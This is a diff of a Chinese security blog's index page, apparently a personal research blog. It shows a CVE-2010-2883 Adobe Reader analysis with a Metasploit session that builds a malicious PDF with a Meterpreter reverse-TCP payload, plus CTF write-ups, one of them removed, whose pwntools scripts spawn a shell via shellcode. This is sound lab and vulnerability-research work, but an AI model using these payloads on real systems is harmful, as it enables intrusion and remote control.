@@ -114,6 +114,64 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/07/03/一道有意思的pwn题目/" >记一道有意思的ctf题目</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-07-03  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+
+	
+
+	</div>
+  <a type="button" href="/2021/07/03/一道有意思的pwn题目/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>原题目是pwnable.tw上边的calc，数组越界读写类的题目，</p>
+<p>解题过程：首先通过越界读和printf把ebp泄漏出来，可以得到栈地址的信息，然后将rop写到retaddr处，利用ROPgadget寻找rop的地址，利用泄漏的栈地址计算当前栈的位置，把”/bin/sh”写到栈空间上的地址，也写到rop链中，并利用pop ebx,把地址保存到ebx中。实现 int 0x80系统调用。</p>
+<p>(PS:漏洞利用点是看网上大神的题解才知道的)</p>
+
+	
+	</div>
+  <a type="button" href="/2021/07/03/一道有意思的pwn题目/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/06/26/Angr初探/" >Angr初探</a>
 		</h3>
 		</div>
@@ -662,41 +720,41 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; options                                 Module options (exploit/windows/fileformat/adobe_cooltype_sing):           </span><br><span class="line">   Name      Current Setting  Required  Description                         </span><br><span class="line">   ----      ---------------  --------  -----------                    </span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.                                   </span><br><span class="line">   Exploit target:                                                               </span><br><span class="line">   Id  Name                                       </span><br><span class="line">   --  ----                                      </span><br><span class="line">   0   Automatic                                                   </span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp                                                  </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp </span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; options</span><br><span class="line">Module options (exploit/windows/fileformat/adobe_cooltype_sing):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST =&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set filename msf4444.pdf</span><br><span class="line">filename =&gt; msf4444.pdf</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit </span><br><span class="line">[*] Creating &#x27;msf4444.pdf&#x27; file...</span><br><span class="line">[+] msf4444.pdf stored at /home/kali/.msf4/local/msf4444.pdf</span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; back</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; options </span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST =&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>反弹shell成功：</p>
-<p><img src="/.io//%E5%8F%8D%E5%BC%B9shell.png"></p>
-<p><img src="/.io//%E5%8F%8D%E5%BC%B9shell2.png"></p>
+<p><img src="%E5%8F%8D%E5%BC%B9shell.png"></p>
+<p><img src="%E5%8F%8D%E5%BC%B9shell2.png"></p>
 <p>表明样本构造成功：</p>
 <h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a>2.样本行为分析</h3><p>使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：</p>
-<p><img src="/.io//%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png"></p>
+<p><img src="%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png"></p>
 <h3 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3.静态分析"></a>3.静态分析</h3><p>基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：</p>
-<p><img src="/.io//SING.png"></p>
+<p><img src="SING.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; SING表的入口处的值</span><br><span class="line">.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *src</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *dest</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat          ; 造成溢出</span><br></pre></td></tr></table></figure>
 
 <h3 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4.动态分析"></a>4.动态分析</h3><p>使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：</p>
-<p><img src="/.io//OD1.png"></p>
+<p><img src="OD1.png"></p>
 <p>注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：</p>
-<p><img src="/.io//OD2.png"></p>
+<p><img src="OD2.png"></p>
 <p>打开样本触发断点：</p>
-<p><img src="/.io//OD4.png"></p>
+<p><img src="OD4.png"></p>
 <p>继续执行，到造成溢出处断下，数据拷贝方向如下：</p>
-<p><img src="/.io//OD5.png"></p>
+<p><img src="OD5.png"></p>
 <p>f8执行，栈空间已被覆盖：</p>
-<p><img src="/.io//OD6.png"></p>
+<p><img src="OD6.png"></p>
 <p>参考漏洞战争，在这下个断点：</p>
-<p><img src="/.io//OD7.png"></p>
+<p><img src="OD7.png"></p>
 <p>f7单步步入，在此处返回，ROP指令1：</p>
-<p><img src="/.io//OD8.png"></p>
+<p><img src="OD8.png"></p>
 <p>ROP指令2：</p>
-<p><img src="/.io//ROP1.png"></p>
+<p><img src="ROP1.png"></p>
 <p>ROP指令3：</p>
-<p><img src="/.io//ROP2.png"></p>
+<p><img src="ROP2.png"></p>
 <p>ROP指令4：</p>
-<p><img src="/.io//ROP4.png"></p>
+<p><img src="ROP4.png"></p>
 <p>通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();</p>
 <p>CreateFileMapping();</p>
 <p>MapViewOfFile();</p>
 <p>memcpy()</p>
 <p>等一系列函数来绕过DEP保护。</p>
-<p><img src="/.io//Createfile.png"></p>
+<p><img src="Createfile.png"></p>
 
 	
 	</div>
@@ -1224,7 +1282,7 @@
   <div class="row">
 	
 	
-		<h2 id="一、Python知识图谱"><a href="#一、Python知识图谱" class="headerlink" title="一、Python知识图谱"></a>一、Python知识图谱</h2><p><img src="/.io//python.png"></p>
+		<h2 id="一、Python知识图谱"><a href="#一、Python知识图谱" class="headerlink" title="一、Python知识图谱"></a>一、Python知识图谱</h2><p><img src="python.png"></p>
 <h2 id="二、数据结构"><a href="#二、数据结构" class="headerlink" title="二、数据结构"></a>二、数据结构</h2><h3 id="1-列表（list）和元组（tuple）"><a href="#1-列表（list）和元组（tuple）" class="headerlink" title="1.列表（list）和元组（tuple）"></a>1.列表（list）和元组（tuple）</h3><p>列表和元组，都是<strong>一个可以放置任意数据类型的有序集合</strong>。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&quot;string&quot;</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;string&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;string&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
 
@@ -2339,7 +2397,7 @@
 	
 		<p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p>
 <p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p>
-<p><img src="/.io//orw.png"></p>
+<p><img src="orw.png"></p>
 <p>使用IDA Pro反汇编程序：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; // starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure>
 
@@ -2358,120 +2416,6 @@
 	
 	</div>
   <a type="button" href="/2020/03/21/Writeup-of-pwnable-tw之orw/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/03/20/Writeup-of-pwnable-tw之start/" >Writeup of pwnable.tw之start</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-03-20  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-
-		
-        
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-
-	
-
-	</div>
-  <a type="button" href="/2020/03/20/Writeup-of-pwnable-tw之start/#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>题目地址：pwable.tw</p>
-<p>使用checksec查看开启了哪些防护措施：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>使用objdump -d进行反汇编：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:    54                       push   %esp</span><br><span class="line"> 8048061:    68 9d 80 04 08           push   $0x804809d</span><br><span class="line"> 8048066:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 8048068:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 804806a:    31 c9                    xor    %ecx,%ecx</span><br><span class="line"> 804806c:    31 d2                    xor    %edx,%edx</span><br><span class="line"> 804806e:    68 43 54 46 3a           push   $0x3a465443</span><br><span class="line"> 8048073:    68 74 68 65 20           push   $0x20656874</span><br><span class="line"> 8048078:    68 61 72 74 20           push   $0x20747261</span><br><span class="line"> 804807d:    68 73 20 73 74           push   $0x74732073</span><br><span class="line"> 8048082:    68 4c 65 74 27           push   $0x2774654c //将要显示的字符串压栈</span><br><span class="line"> 8048087:    89 e1                    mov    %esp,%ecx</span><br><span class="line"> 8048089:    b2 14                    mov    $0x14,%dl</span><br><span class="line"> 804808b:    b3 01                    mov    $0x1,%bl</span><br><span class="line"> 804808d:    b0 04                    mov    $0x4,%al</span><br><span class="line"> 804808f:    cd 80                    int    $0x80</span><br><span class="line"> 8048091:    31 db                    xor    %ebx,%ebx</span><br><span class="line"> 8048093:    b2 3c                    mov    $0x3c,%dl</span><br><span class="line"> 8048095:    b0 03                    mov    $0x3,%al</span><br><span class="line"> 8048097:    cd 80                    int    $0x80</span><br><span class="line"> 8048099:    83 c4 14                 add    $0x14,%esp</span><br><span class="line"> 804809c:    c3                       ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:    5c                       pop    %esp</span><br><span class="line"> 804809e:    31 c0                    xor    %eax,%eax</span><br><span class="line"> 80480a0:    40                       inc    %eax</span><br><span class="line"> 80480a1:    cd 80                    int    $0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p>
-<p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p>
-<p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p>
-<p> 8048060:    54                       push   %esp</p>
-<p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p>
-<p>具体思路如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)                  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       jmp esp&#x27;&#x27;&#x27;</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>或这样：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">&#x27;&#x27;&#x27;mov al,0x03\n</span></span><br><span class="line"><span class="string">       sub esp,0x40\n</span></span><br><span class="line"><span class="string">       mov ecx,esp\n</span></span><br><span class="line"><span class="string">       mov dl,0x40\n</span></span><br><span class="line"><span class="string">       int 0x80\n</span></span><br><span class="line"><span class="string">       ret&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span>-<span class="number">0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2020/03/20/Writeup-of-pwnable-tw之start/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -2524,33 +2468,33 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/unix/">unix<span>2</span></a></li>
-		
-			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
-		
-			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+			<li><a href="/tags/windows内核/">windows内核<span>5</span></a></li>
 		
 			<li><a href="/tags/正则表达式/">正则表达式<span>1</span></a></li>
 		
+			<li><a href="/tags/漏洞研究/">漏洞研究<span>1</span></a></li>
+		
 			<li><a href="/tags/fuzzing/">fuzzing<span>1</span></a></li>
-		
-			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
-		
-			<li><a href="/tags/windows内核/">windows内核<span>4</span></a></li>
-		
